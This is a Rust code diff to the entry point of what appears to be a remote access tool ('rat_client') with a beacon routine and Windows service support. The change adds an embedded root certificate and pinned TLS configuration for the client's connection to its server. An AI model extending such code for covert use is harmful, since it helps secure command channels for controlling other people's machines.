@@ -4,15 +4,20 @@ use clap::Parser;
 use log::info;
 use rat_client::cli::Arguments;
 use rat_client::client::Client;
+use rat_client::config::Config;
 #[cfg(windows)]
 use rat_client::service::WindowsServiceDispatcher;
 use rat_common::framework::Module;
 use rat_common::logger::initialize_logger;
+use rustls::pki_types::pem::PemObject;
+use rustls::pki_types::{CertificateDer, ServerName};
 use tokio::signal;
 
-async fn beacon(host: String) -> Option<Arc<Client>> {
+const ROOT_CA: &[u8] = include_bytes!("../../certs/root.crt");
+
+async fn beacon(config: Config) -> Option<Arc<Client>> {
     tokio::select! {
-        client = Client::connect(host) => {
+        client = Client::connect(config) => {
             Some(Arc::new(client))
         }
         _ = signal::ctrl_c() => {
@@ -34,8 +39,19 @@ async fn main() -> anyhow::Result<()> {
         None
     };
 
+    let mut trusted_roots = rustls::RootCertStore::empty();
+    for cert in CertificateDer::pem_reader_iter(ROOT_CA) {
+        trusted_roots.add(cert?)?;
+    }
+
+    let config = Config {
+        server: arguments.host.clone(),
+        cert_server_name: ServerName::try_from("rat-server")?,
+        cert_trusted_roots: trusted_roots,
+    };
+
     info!("Starting client: {arguments:?}");
-    let client = match beacon(arguments.host).await {
+    let client = match beacon(config).await {
         Some(c) => c,
         None => {
             return Ok(());
